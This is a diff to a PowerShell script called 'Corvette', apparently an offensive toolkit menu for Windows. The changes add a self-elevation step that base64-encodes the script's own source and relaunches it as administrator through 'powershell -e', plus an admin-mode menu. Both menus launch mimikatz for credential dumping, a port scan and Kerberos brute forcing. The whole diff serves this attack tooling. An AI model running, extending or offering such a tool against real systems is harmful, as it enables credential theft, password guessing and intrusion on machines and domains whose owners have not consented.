@@ -61,18 +61,30 @@ function DownloadAndExtractArchive ([string]$url, [string]$directory) {
 }
 
 class Properties {
+    [string]$my_script
     [string]$home_dir
 
-    Properties([string]$home_dir) {
+    Properties([System.Management.Automation.InvocationInfo]$info, [string]$home_dir) {
+        if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
+            $this.my_script = $info.MyCommand
+        } else {
+            $this.my_script = [System.IO.File]::ReadAllText($info.MyCommand.Path)
+        }
         $this.home_dir = $home_dir
+    }
+    
+    [void]MakeSureHomeDirectoryPathExists() {
+        New-Item -ItemType Directory -Force -Path $this.home_dir
     }
 }
 
 class Mimikatz {
+    [Properties]$props
     [string]$mimikatz_dir
     [string]$mimikatz_exe
 
     Mimikatz([Properties]$props) {
+        $this.props = $props
         $this.mimikatz_dir = BuildFullPath $props.home_dir ".\mimikatz"
         $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"
         $this.Prepare()
@@ -85,8 +97,12 @@ class Mimikatz {
         }
     }
 
-    [void]Run() {
-        Start-Process -FilePath $this.mimikatz_exe
+    [void]Run([bool]$run_as) {
+        if ($run_as) {
+            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir -verb runas
+        } else {
+            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir
+        }
     }
 }
 
@@ -154,15 +170,17 @@ class KerberosBruteForce {
 class Menu {
     [Properties]$props
     
-    Menu() {
-        $home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
-        New-Item -ItemType Directory -Force -Path $home_dir
-
-        $this.props = [Properties]::New($home_dir)
+    Menu([Properties]$props) {
+        $this.props = $props
     }
 
-    hidden [bool]LaunchCommand($cmd) {
+    hidden [bool]LaunchUserModeCommand($cmd) {
         switch ($cmd) {
+            "0" {
+                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($this.props.my_script))
+                $args = @("-e", $script)
+                Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
+            }
             "1" {
                 Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
             }
@@ -178,12 +196,15 @@ class Menu {
                 Start-Process -FilePath powershell.exe -verb runas -ArgumentList $args
             }
             "5" {
-                [Mimikatz]::New($this.props).Run()
+                [Mimikatz]::New($this.props).Run($false)
             }
             "6" {
-                [PortScan]::New($this.props).Run()
+                [Mimikatz]::New($this.props).Run($true)
             }
             "7" {
+                [PortScan]::New($this.props).Run()
+            }
+            "8" {
                 [KerberosBruteForce]::New($this.props).Run()
             }
             default {
@@ -193,21 +214,74 @@ class Menu {
         return $true
     }
 
-    [void]OpenMenu() {
+    hidden [void]OpenUserModeMenu() {
         Write-Host "Corvette"
         while ($true) {
             Write-Host "************************************"
+            Write-Host " 0) Run as administrator"
             Write-Host " 1) Create a new command shell"
             Write-Host " 2) Create a new powershell"
             Write-Host " 3) Create a new command shell (Run as administrator)"
             Write-Host " 4) Create a new powershell (Run as administrator)"
             Write-Host " 5) Run mimikatz"
-            Write-Host " 6) Run port scan"
-            Write-Host " 7) Run Kerberos Brute Force"
+            Write-Host " 6) Run mimikatz (Run as administrator)"
+            Write-Host " 7) Run port scan"
+            Write-Host " 8) Run Kerberos Brute Force"
 
-            while (!$this.LaunchCommand((Read-Host "Please choose a menu item to run"))) {}
+            while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
+        }
+    }
+
+    hidden [bool]LaunchAdminModeCommand($cmd) {
+        switch ($cmd) {
+            "1" {
+                Start-Process -FilePath cmd.exe -WorkingDirectory $this.props.home_dir
+            }
+            "2" {
+                Start-Process -FilePath powershell.exe -WorkingDirectory $this.props.home_dir
+            }
+            "3" {
+                [Mimikatz]::New($this.props).Run($false)
+            }
+            "4" {
+                [PortScan]::New($this.props).Run()
+            }
+            "5" {
+                [KerberosBruteForce]::New($this.props).Run()
+            }
+            default {
+                return $false
+            }
+        }
+        return $true
+    }
+
+    hidden [void]OpenAdminModeMenu() {
+        Write-Host "Corvette"
+        while ($true) {
+            Write-Host "************************************"
+            Write-Host " 1) Create a new command shell"
+            Write-Host " 2) Create a new powershell"
+            Write-Host " 3) Run mimikatz"
+            Write-Host " 4) Run port scan"
+            Write-Host " 5) Run Kerberos Brute Force"
+
+            while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
+        }
+    }
+
+    [void]OpenMenu() {
+        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            $this.OpenAdminModeMenu()
+        } else {
+            $this.OpenUserModeMenu()
         }
     }
 }
-$MyInvocation.MyCommand.Path
-[Menu]::New().OpenMenu()
+
+$home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
+$props = [Properties]::New($MyInvocation, $home_dir)
+$props.MakeSureHomeDirectoryPathExists()
+
+[Menu]::New($props).OpenMenu()
